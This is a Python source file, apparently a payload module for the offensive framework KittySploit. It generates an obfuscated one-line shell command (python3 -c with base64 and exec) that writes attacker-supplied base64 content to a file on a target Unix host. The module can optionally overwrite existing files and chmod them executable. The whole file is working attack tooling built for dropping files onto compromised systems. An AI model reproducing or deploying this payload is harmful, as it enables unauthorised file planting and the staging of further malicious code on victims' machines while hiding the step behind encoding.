from kittysploit import *
import base64
import shlex


class Module(Payload):

    CLIENT_LANGUAGE = "python"

    __info__ = {
        'name': 'Unix File Writer (via Python)',
        'description': 'Write base64-decoded content to a local file without opening a network connection',
        'author': 'KittySploit Team',
        'category': PayloadCategory.CMD,
        'arch': Arch.PYTHON,
        'platform': Platform.UNIX,
        'listener': '',
        'handler': '',
        'session_type': ''
    }

    output_path = OptString('/tmp/kitty_payload.txt', 'File path to write on the target', True)
    content_b64 = OptString('SGVsbG8gZnJvbSBLaXR0eVNwbG9pdAo=', 'Base64 content to write', True)
    python_binary = OptString('python3', 'Python binary version', True)
    overwrite = OptBool(False, 'Overwrite the destination if it already exists', False)
    chmod = OptString('', 'Optional chmod mode after write, e.g. 600 or 755', False, True)
    encoder = OptString('', 'Encoder', False, True)

    def _build_script(self) -> str:
        path = str(self.output_path)
        content = str(self.content_b64).strip()
        mode = 'wb' if self.overwrite else 'xb'
        chmod = str(self.chmod).strip()
        lines = [
            "import base64,os,sys",
            f"path={path!r}",
            f"data=base64.b64decode({content!r})",
            "parent=os.path.dirname(path)",
            "if parent: os.makedirs(parent, exist_ok=True)",
            f"with open(path,{mode!r}) as f: f.write(data)",
        ]
        if chmod:
            lines.append(f"os.chmod(path,int({chmod!r},8))")
        lines.append("print('wrote %d bytes to %s' % (len(data), path))")
        return "\n".join(lines) + "\n"

    def get_python_script(self):
        return self._build_script()

    def generate(self):
        script = self._build_script()
        encoded = base64.b64encode(script.encode('utf-8')).decode('ascii')
        return f"{shlex.quote(str(self.python_binary))} -c \"import base64;exec(base64.b64decode('{encoded}').decode())\""
